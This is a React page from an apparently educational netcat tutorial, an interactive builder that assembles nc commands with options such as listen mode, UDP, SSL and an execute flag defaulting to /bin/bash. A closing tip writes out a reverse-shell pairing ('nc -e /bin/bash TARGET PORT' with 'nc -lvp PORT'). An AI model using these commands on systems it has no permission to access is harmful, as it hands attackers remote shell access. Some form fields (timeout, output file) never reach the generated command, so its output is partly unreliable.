'use client'

import { useState, useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import Callout from '@/components/base/Callout';
import InlineCode from '@/components/base/InlineCode';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const modes = [
  { value: 'connect', label: 'Connect (client)' },
  { value: 'listen', label: 'Listen (server)' },
];

export default function NetcatCommandBuilderPage() {
  const [mode, setMode] = useState('connect');
  const [target, setTarget] = useState('10.0.0.1');
  const [port, setPort] = useState('4444');
  const [sourceIp, setSourceIp] = useState('');
  const [sourcePort, setSourcePort] = useState('');
  const [timeoutValue, setTimeoutValue] = useState('3');
  const [protocol, setProtocol] = useState('tcp');
  const [verbose, setVerbose] = useState(false);
  const [quiet, setQuiet] = useState(false);
  const [execMode, setExecMode] = useState(false);
  const [execCmd, setExecCmd] = useState('/bin/bash');
  const [ssl, setSsl] = useState(false);
  const [proxy, setProxy] = useState('');
  const [output, setOutput] = useState('');
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  const getCommand = () => {
    const parts = ['nc'];
    const flags = [];

    if (mode === 'listen') {
      flags.push('-l');
    }

    if (sourceIp) flags.push(`-s ${sourceIp}`);
    if (sourcePort) flags.push(`-p ${sourcePort}`);
    else if (mode === 'listen') flags.push(`-p ${port}`);

    if (protocol === 'udp') flags.push('-u');
    if (verbose) flags.push('-v');
    if (quiet) flags.push('-q');
    if (execMode) flags.push(`-e ${execCmd}`);
    if (ssl) flags.push('--ssl');
    if (proxy) flags.push(`--proxy ${proxy}`);

    const portArg = mode === 'listen' ? '' : ` ${target} ${port}`;

    return `nc ${flags.join(' ')}${portArg}`;
  };

  const copyCommand = () => {
    navigator.clipboard.writeText(getCommand());
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-tools-line" />
          Netcat Section 9 of 14
        </div>
        <DocHeading level={1}>Interactive Command Builder</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3 text-lg">
          Build netcat commands visually. Choose connect or listen mode, set target/port, add optional flags, and copy the exact command you need.
        </p>
      </motion.div>

      <motion.section className="mt-10" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="cyber-card p-5 md:p-6">
          {/* Mode */}
          <div className="mb-5">
            <label className="text-sm font-semibold text-white block mb-2">Mode</label>
            <div className="flex flex-wrap gap-2">
              {modes.map((m) => (
                <button
                  key={m.value}
                  type="button"
                  onClick={() => setMode(m.value)}
                  className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all whitespace-nowrap ${
                    mode === m.value
                      ? 'bg-cyber-red/10 border-cyber-red text-cyber-red'
                      : 'bg-cyber-bg border-cyber-border text-cyber-text hover:border-cyber-red/50'
                  }`}
                >
                  {m.label}
                </button>
              ))}
            </div>
          </div>

          {/* Target */}
          {mode === 'connect' && (
            <div className="mb-4">
              <label className="text-sm font-semibold text-white block mb-2">Target IP / Hostname</label>
              <input
                type="text"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                placeholder="10.0.0.1"
              />
            </div>
          )}

          {/* Port */}
          <div className="mb-4">
            <label className="text-sm font-semibold text-white block mb-2">
              {mode === 'connect' ? 'Destination Port' : 'Listen Port'}
            </label>
            <input
              type="number"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
              placeholder="4444"
            />
          </div>

          {/* Source IP & Port */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div>
              <label className="text-sm font-semibold text-white block mb-2">Source IP (optional)</label>
              <input
                type="text"
                value={sourceIp}
                onChange={(e) => setSourceIp(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                placeholder="10.0.0.2"
              />
            </div>
            <div>
              <label className="text-sm font-semibold text-white block mb-2">Source Port (optional)</label>
              <input
                type="text"
                value={sourcePort}
                onChange={(e) => setSourcePort(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                placeholder="any"
              />
            </div>
          </div>

          {/* Protocol & Timeout */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div>
              <label className="text-sm font-semibold text-white block mb-2">Protocol</label>
              <select
                value={protocol}
                onChange={(e) => setProtocol(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
              >
                <option value="tcp">TCP</option>
                <option value="udp">UDP</option>
              </select>
            </div>
            <div>
              <label className="text-sm font-semibold text-white block mb-2">Timeout (-w seconds)</label>
              <input
                type="text"
                value={timeoutValue}
                onChange={(e) => setTimeoutValue(e.target.value)}
                className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                placeholder="3"
              />
            </div>
          </div>

          {/* Checkboxes */}
          <div className="mb-4 space-y-3">
            <div className="flex items-center gap-3">
              <input
                type="checkbox"
                id="verbose"
                checked={verbose}
                onChange={(e) => setVerbose(e.target.checked)}
                className="w-4 h-4 rounded border-cyber-border bg-cyber-bg text-cyber-red focus:ring-cyber-red"
              />
              <label htmlFor="verbose" className="text-sm text-cyber-text">Verbose (-v)</label>
            </div>
            <div className="flex items-center gap-3">
              <input
                type="checkbox"
                id="quiet"
                checked={quiet}
                onChange={(e) => setQuiet(e.target.checked)}
                className="w-4 h-4 rounded border-cyber-border bg-cyber-bg text-cyber-red focus:ring-cyber-red"
              />
              <label htmlFor="quiet" className="text-sm text-cyber-text">Quit after EOF (-q)</label>
            </div>
            <div className="flex items-center gap-3">
              <input
                type="checkbox"
                id="exec"
                checked={execMode}
                onChange={(e) => setExecMode(e.target.checked)}
                className="w-4 h-4 rounded border-cyber-border bg-cyber-bg text-cyber-red focus:ring-cyber-red"
              />
              <label htmlFor="exec" className="text-sm text-cyber-text">Execute program (-e)</label>
            </div>
            {execMode && (
              <div className="ml-7">
                <input
                  type="text"
                  value={execCmd}
                  onChange={(e) => setExecCmd(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                  placeholder="/bin/bash"
                />
              </div>
            )}
            <div className="flex items-center gap-3">
              <input
                type="checkbox"
                id="ssl"
                checked={ssl}
                onChange={(e) => setSsl(e.target.checked)}
                className="w-4 h-4 rounded border-cyber-border bg-cyber-bg text-cyber-red focus:ring-cyber-red"
              />
              <label htmlFor="ssl" className="text-sm text-cyber-text">SSL/TLS (--ssl, ncat only)</label>
            </div>
            <div className="flex items-center gap-3">
              <input
                type="checkbox"
                id="proxy"
                checked={!!proxy}
                onChange={(e) => setProxy(e.target.checked ? 'proxy:1080' : '')}
                className="w-4 h-4 rounded border-cyber-border bg-cyber-bg text-cyber-red focus:ring-cyber-red"
              />
              <label htmlFor="proxy" className="text-sm text-cyber-text">Use Proxy (--proxy)</label>
            </div>
            {proxy && (
              <div className="ml-7">
                <input
                  type="text"
                  value={proxy}
                  onChange={(e) => setProxy(e.target.value)}
                  className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
                  placeholder="10.0.0.1:1080"
                />
              </div>
            )}
          </div>

          {/* Output */}
          <div className="mb-5">
            <label className="text-sm font-semibold text-white block mb-2">Redirect Output (-o file)</label>
            <input
              type="text"
              value={output}
              onChange={(e) => setOutput(e.target.value)}
              className="w-full bg-cyber-bg border border-cyber-border rounded-lg px-3 py-2 text-sm text-cyber-text font-mono focus:outline-none focus:border-cyber-red"
              placeholder="output.txt (optional)"
            />
          </div>

          {/* Generated Command */}
          <div className="bg-cyber-bg border border-cyber-border rounded-lg p-4">
            <div className="flex items-center justify-between mb-2">
              <span className="text-xs font-semibold text-cyber-red uppercase tracking-wider">Generated Command</span>
              <button
                type="button"
                onClick={copyCommand}
                className="text-xs text-cyber-cyan hover:text-cyber-cyan-dim transition-colors flex items-center gap-1"
              >
                <i className={copied ? 'ri-check-line text-cyber-green' : 'ri-file-copy-line'} />
                {copied ? 'Copied!' : 'Copy'}
              </button>
            </div>
            <code className="text-sm font-mono text-cyber-green break-all">{getCommand()}</code>
          </div>
        </div>
      </motion.section>

      <motion.section className="mt-8 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <Callout type="tip">
          For reverse shells, pair <InlineCode>nc -e /bin/bash TARGET PORT</InlineCode> with a listener: <InlineCode>nc -lvp PORT</InlineCode>. For file transfer, use <InlineCode>&lt;</InlineCode> and <InlineCode>&gt;</InlineCode> redirection on the sender/receiver side.
        </Callout>

        <div className="mt-8 flex gap-3">
          <a href="/netcat/pro-tips" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            Next: Pro Tips <i className="ri-arrow-right-line ml-1" />
          </a>
          <a href="/netcat/examples" className="px-5 py-2.5 rounded-lg border border-cyber-border text-sm font-semibold text-cyber-text hover:border-cyber-amber hover:text-cyber-amber transition-all whitespace-nowrap">
            <i className="ri-arrow-left-line mr-1" /> Back
          </a>
        </div>
      </motion.section>
    </div>
  );
}
